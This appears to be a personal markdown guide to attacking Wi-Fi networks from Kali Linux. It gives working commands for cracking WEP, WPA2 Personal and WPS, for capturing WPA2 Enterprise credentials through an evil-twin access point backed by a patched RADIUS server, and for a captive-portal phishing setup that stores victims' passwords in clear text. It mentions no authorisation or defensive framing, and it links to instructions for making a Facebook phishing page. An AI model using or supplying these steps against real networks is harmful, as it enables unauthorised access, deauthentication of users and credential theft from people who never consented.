# Wireless Attacks Step-By-Step Guid
                        *Created by Rakesh Pujari <rakesh.pujari11@gmail.com>*

================================================================================                        
## Pre-requisite:

- Kali Linux OS running live on your Laptop.
- Alfa Network Adapter AWUS036H or any good wireless adapter.
- A wireless router with WPA2 Enterprise support.

================================================================================

#Index.
```
1. Cracking WEP
2. Cracking WPA2 Personal.
3. Cracking WPA2 Enterprise using Evil Twin Attack.
4. Phishing password using Evil twin attack.
5. Cracking WPS.
```
================================================================================


1. Cracking WEP:
```
   a.	Connect the Alfa card to the kali linux vm. Check the interface name using the below command:
       #iwconfig
   b.	Set the wireless interface to Monitor mode with the following commands:
       # ifconfig wlan0 down
       # iwconfig wlan0 mode monitor
       # ifconfig wlan0 up`
   c.	Confirm the wireless interface is in monitor mode by running the following command:
       # iwconfig wlan0`
   d.	Run the airodump-ng sniffer to gain the details of the access points in the range.
       # airodump-ng wlan0
   e.	The output shows the details of the Access Points (AP) which are in range.
   f.	Note the following details of the AP which you want to crack the password:
      -	AP’s Mac Address (BSSID)
      -	Name of the AP (ESSID)
      -	Channel Number
      -	Privacy (WEP/WPA2), Ciphers(TKIP/CCMP/MGT)
      -	Clients Mac Address (Station Mac)
   g.	Now, start the airodump with filters to capture only the desired AP’s traffic.
      # airodump-ng wlan0 –essid <Name> --bssid <AP Mac> -c  <Channel number> -w <Filename to save capture>
   h.	Initialize a fake authentication with the AP with the following command:
      # aireplay-ng -1 0 –e <ESSID> --bssid <AP Mac> -h <Own mac/ Alfa card mac> wlan0`
   i.	Open another terminal and start ARP replay attack to capture Data packets at a faster rate in   order crack the WEP passkey.
      # aireplay-ng -3 –b <BSSID> -h <own mac/Alfa card mac> wlan0
   j.	Open one more terminal, and deauthenticate a connected client, so that when the user connects back, and performs an ARP , we can capture the ARP request for replay.
      # aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0
   k.	As soon as the ARP request is captured, aireplay will start replaying the arp packet to capture  the data packets at a faster rate. Notice the terminal in which arp replay attack is started and the airodump-ng output for the data packets.
   l.	When 50000 data packets are captured, run the following command to crack the WEP Password.
      # aircrack-ng <capture file name>
   m.	If the password is not cracked, collect more data packets and run the aircrack-ng command again to crack the password.
```
  - There are other methods as well for cracking WEP ex. Korek Chop Chop attack, Fragmentation attack etc.


2. Cracking WPA2 Personal.
   -	Follow the steps a-g, as shown in the WEP Cracking.
   -	Deauthenticate the connected user to capture the WPA 4 way handshake, in which WPA keystream is present.
      `aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0`
   -	Note the airodump-ng output to check if the WPA Handshake is captured.
   -	Once the WPA handshake is captured, crack the password using aircrack-ng dictionary attack.
      `aircrack-ng <captured file> -w <Dictionary file>`


3. Cracking WPA2 Enterprise.

- Setting up Radius Server:
    a.	Download the freeradius server package and WPE support patch for freeradius server from the following links.
      •	`wget ftp://ftp.freeradius.org/pub/radius/old/freeradius-server-2.1.12.tar.bz2`
      •	`wget https://raw.github.com/brad-anton/freeradius-wpe/master/freeradius-wpe.patch`
    b.	Untar the source package using the below command:
      •	`tar -jxvf freeradius-server-2.1.12.tar.bz2`
    c.	Apply the patch to the source package:
      •	cd freeradius-server-2.1.12/
      •	patch -p1 < ../freeradius-wpe.patch
    d.	Now the freeradius is ready to be installed. Follow the below commands step by step to install.
      `./configure
      	Make
      	make install
      	ldconfig`  
    e.	Create certs:
      	`cd /usr/local/etc/raddb/certs/
      	./bootstrap`
    f.	Configure Freeradius to listen on ur IP and configure other settings by editing the following  file.
        `/usr/local/etc/raddb/clients.conf`
        *Add below config: (note u can give ur IP subnet here.*
          `client 192.168.1.0/24 {
            secret = password
          }
	         /usr/local/etc/raddb/eap.conf`
        *set the value of the below parameter to peap*
          `default_eap_type = peap`
    g.	Start Radius server :
          - radiusd -X
    h.	View the below logs for user credentials
          `/usr/local/var/log/radius/freeradius-server-wpe.log`
    i.	You can also follow this link to setup freeradius:
        •	http://resources.infosecinstitute.com/attacking-wpa2-enterprise/

- Setting up Evil Twin Rouge Access Point:
    a.	Connect your wireless router using lan and open the admin page to configure the AP. Ensure Wireless Lan IP is assigned to the kali lan interface.
    b.	Set the SSID of the AP as the one which you want to attack.
    c.	Set the Privacy to WPA2 Enterprise.
    d.	Encryption to AES.
    e.	In Radius server configuration, provide the IP and port of the radius server. Provide the password to connect the AP with the radius server.
    f.	Save the settings. Evil Twin Rogue AP is ready to be used.

- Attack:
    a.	Follow the step a-g, as shown in the WEP cracking.
    b.	Keep your wireless router in such a place where the clients have good range to it.
    c.	Deauth the user from the genuine access point and wait for the user to connect to your Fake AP.
    d.	As soon as the user enters  the username and password, radius server log will show the challenge response for that user.
    e.	Run the following command to crack the password using brute force attack.
        `asleap –C <Challeng> -R< Response> -W <Wordlist>`


4. Phishing Attack.
- Pre-requisite:
    Wireless router which supports Captive portal integration
    or
    A wireless adapter like Alfa Adapter.
    A Phishing page.

  - Setup:
    This setup requires 2 wireless adapters. 1 for performing packet injection and other for setting up a fake access point.
        a.	Connect both the wireless adapters to the Kali. Check the interface name for both the wireless adapters. Configure wlan0 in monitor mode for packet injection and wlan1 as AP.
        b.	Install hostapd
          	`apt-get install hostapd`
        c.	Configure Hostapd to act as an AP.
          - Edit the following file
              `/etc/hostapd/hostapd.conf`
          - Delete all the configuration and add the below lines in the config file.
              `interface=wlan1
               driver=nl80211
               ssid=<name of AP>
               #wpa=2
               channel=11
               #wpa_pairwise=TKIP CCMP
               hw_mode=g`
        d.	Configure wlan1 with IP address schema to act as a gateway.
          - Append the following configuration in thefile:
               `/etc/network/interfaces
                auto wlan1     
                iface wlan1 inet static
                address 10.0.0.1
                netmask 255.255.255.0
                network 10.0.0.0
                broadcast 10.0.0.255`
        e.	Apply the interface configuration using following commands:
               `ifconfig wlan1 down
              	ifconfig wlan1 up
                ifup wlan1`

        f.	Install and configure the DHCP server for the access point.
               `apt-get install isc-dhcp-server`
          -	Edit the following files:
              	`/etc/default/isc-dhcp-server`
          - set the value of the interfaces parameter to wlan1.
                `interfaces = “wlan1”
                 /etc/dhcp/dhcpd.conf`
          - Remove all the lines from the file and set the below lines:
                `ddns-update-style none;
                 option domain-name "example.org";
                 option domain-name-servers ns1.example.org, ns2.example.org;
                 default-lease-time 600;
                 max-lease-time 7200;
                 log-facility local7;
                 subnet 10.0.0.0 netmask 255.255.255.0 {
                   option routers 10.0.0.1;
                   option subnet-mask 255.255.255.0;
                   range 10.0.0.5 10.0.0.200;
                   option broadcast-address 10.0.0.255;
                 }`
        g.	Start the dhcp server by running the following command:
                `service isc-dhcp-server start`
        h.	Create a  Fake Login page.
        i.	The below link gives an example of creating a fake login page:
          -	http://www.techtechnik.com/how-to-make-phishing-page-for-facebook/
        j.	Save the fake page as index.html and post.php file in the /var/www/html/ folder .
        k.	Start the apache web server :
                `service apache2 start`
        l.  Save the following configuration in a file:
          - update the Bold variables as per your setup.
          - Generated by iptables-save v1.4.21 on Fri Jun  3 20:56:55 2016
                `*filter
                 :INPUT ACCEPT [7545:899138]
                 :FORWARD ACCEPT [74:9830]
                 :OUTPUT ACCEPT [5851:5068639]
                 -A FORWARD -i wlan1 -j ACCEPT
                 COMMIT`
            # Completed on Fri Jun  3 20:56:55 2016
            # Generated by iptables-save v1.4.21 on Fri Jun  3 20:56:55 2016
                `*nat
                 :PREROUTING ACCEPT [147:15550]
                 :INPUT ACCEPT [404:28911]
                 :OUTPUT ACCEPT [34:2516]
                 :POSTROUTING ACCEPT [7:789]
                 -A PREROUTING -i wlan1 -p tcp -m mark --mark 0x1 -j DNAT --to-destination 10.0.0.1
                 -A POSTROUTING -o eth1 -j MASQUERADE  #Here eth1 is the interface through which internet is accessible.
                 COMMIT`
          # Completed on Fri Jun  3 20:56:55 2016
          # Generated by iptables-save v1.4.21 on Fri Jun  3 20:56:55 2016
                `*mangle
                 :PREROUTING ACCEPT [7267:881226]
                 :INPUT ACCEPT [7090:863142]
                 :FORWARD ACCEPT [152:15004]
                 :OUTPUT ACCEPT [5453:5020635]
                 :POSTROUTING ACCEPT [5648:5042330]
                 :captive - [0:0]
                 -A PREROUTING -i wlan1 -p udp -m udp --dport 53 -j RETURN
                 -A PREROUTING -i wlan1 -j captive
                 -A captive -j MARK --set-xmark 0x1/0xffffffff
                 COMMIT`
          # Completed on Fri Jun  3 20:56:55 2016
        m.	Set the firewall rules by running  the following command:
                 `iptables-restore <firewall rules file as created in step k.>`
        n.	Enable IP Forwarding with the following commandl
                  `echo 1 > /proc/sys/net/ipv4/ip_forward`
        o.	Now the AP is ready to be started. Run the following command:
                   `hostapd /etc/hostapd/hostapd.conf`
        p.	If the hostapd fails to start, stop the network-manager process with the following command and start the hostapd again.
                   `service network-manager stop`
        q.	When the user connects to the Fake AP and enters any website like google.com or yahoo.com, he /she would be redirected towards the fake login page.
       *Note: For redirection to happen, internet should be accessible on the Kali linux.*
        r.	Upon entering the username and password in the login page, the password will be saved in a file called username.txt in clear text.

5. Cracking WPS
        1.	Start airodump-ng and gather information like MAC, channel number about the desired SSID.
        2.	Run the following command to check if WPS is enabled on the given SSID.
            `wash –i  wlan0`
        3.	This will show whether the WPS is enabled or not.
        4.	Run the following command to crack the key of the SSID if WPS is enabled:
            `reaver –i wlan0 –b <AP Mac> -c <AP channel> -vv –L –N –T .5 –r 20:15
            -L : ignore Locked WPS state
            -N: Dont send NAck packets when error detected
            -T: set timeout period of half a second
            -r: set a recurring delay of 15 seconds after 20 pin attempts.`
        *Note: Reaver would take upto 24hrs to crack the password.*


##Automated Tool for WEP, WPA  Personal and WPS.##
        1.	Wifite.
          - Run the following command in kali terminal
             `Wifite`
          - Follow the on screen steps to perform the attacks.
  - Dictionary Wordlists are present in /usr/share/wordlists/  and /usr/share/john/  folder.
